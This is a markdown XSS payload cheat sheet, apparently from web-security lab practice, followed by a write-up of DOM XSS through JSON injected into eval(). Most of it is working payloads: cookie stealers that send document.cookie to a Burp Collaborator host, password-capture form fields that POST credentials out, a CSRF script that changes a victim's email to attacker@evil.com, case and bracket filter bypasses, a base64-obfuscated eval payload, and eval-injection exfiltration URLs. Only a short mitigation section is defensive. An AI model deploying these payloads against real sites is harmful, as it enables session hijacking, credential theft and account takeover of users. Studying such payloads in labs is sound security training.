# XSS Payloads

## Cookie Stealers

### Basic Cookie Stealer
```html
<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

### Image-Based
```html
<script>document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</script>
```

### Fetch-Based
```javascript
<script>fetch('http://burp.oastify.com?c='+btoa(document.cookie))</script>
```

## Context-Specific Payloads

### Breaking Out of Select Tag
```javascript
"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

### AngularJS Expression
```javascript
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```

### Reflected DOM XSS
```javascript
\\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```

### Stored DOM (First Bracket Bypass)
```html
<><img src=1 onerror="window.location='http://burp.oastify.com/?c='+document.cookie">
```

## Password Capture

### Basic Form
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://burp.oastify.com',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
});">
```

### With Autocomplete
```html
<input name="username" id="username" autocomplete="username">
<input type="password" id="password" name="password" autocomplete="password" 
  onchange="if(this.value.length)fetch('http://burp.oastify.com',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
  });">
```

## CSRF via XSS

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();

function handleResponse() {
  var token = this.responseText.match(/name=\"csrf\" value=\"(\w+)\"/)[1];
  var changeReq = new XMLHttpRequest();
  changeReq.open('post', '/my-account/change-email', true);
  changeReq.send('csrf='+token+'&email=attacker@evil.com');
}
</script>
```

## Bypass Techniques

### Case Variation
```html
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt >
```

### Bracket Notation
```javascript
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"
```

### Base64 Eval
```javascript
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```

## Quick Reference

Replace `burp.oastify.com` with your Burp Collaborator URL!


# DOM-Based XSS via JSON Injection into eval()

## Vulnerability Overview
The application uses `eval()` to parse JSON response containing user input, allowing JavaScript injection through JSON string escaping.

## Vulnerable Code
```javascript
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        eval('var searchResultsObj = ' + this.responseText);
        displaySearchResults(searchResultsObj);
    }
};
```

## Attack Vector

### Payload
```
/?search=\%22};fetch(`https://YOUR-COLLABORATOR.com?c=${document.cookie}`);//
```

### How It Works

**Step 1: URL Parameter**
```
search=\%22};fetch(`https://...`);//
```

**Step 2: Server Response (JSON)**
```json
{"results":[],"searchTerm":"\\"};fetch(`https://...`);//"}
```

**Step 3: eval() Executes**
```javascript
var searchResultsObj = {"results":[],"searchTerm":"\\"};fetch(`https://...`);//"}
```

**Breakdown:**
- `"\\"` - In JSON string, `\\` = single backslash, `\"` = escaped quote
- When JavaScript evaluates this: `\\"` becomes literal `\"` in the string
- The `\"` ends the string value for `searchTerm`
- `}` closes the object
- `;` ends the variable declaration
- `fetch(...)` executes arbitrary JavaScript
- `;//"` comments out the trailing `"}`

## Key Concepts

### Double Escaping
- **URL**: `\%22` (backslash + URL-encoded quote)
- **JSON**: `\\"` (escaped backslash + quote in JSON)
- **Evaluated JS**: `\"` (literal backslash-quote in string, which ends the string)

### Why This Works
1. The backslash in JSON (`\\`) becomes a literal `\` character
2. The quote after it (`"`) is NOT escaped in the JavaScript string literal context
3. This unescaped quote breaks out of the string
4. The rest is valid JavaScript that executes

## Alternative Payloads

```
# Using Image for exfiltration
/?search=\%22};new%20Image().src=`https://COLLAB?c=${document.cookie}`;//

# Using document.location (redirects)
/?search=\%22};document.location=`https://COLLAB?c=${document.cookie}`;//

# Using alert for POC
/?search=\%22};alert(document.domain);//
```

## Mitigation
- **Never use eval()** on user-controlled data
- Use `JSON.parse()` instead of `eval()` for JSON
- Implement proper output encoding
- Use Content Security Policy (CSP) to prevent inline script execution

## Root Cause
Using `eval()` to parse JSON instead of `JSON.parse()`, combined with insufficient input validation/sanitization on the server side.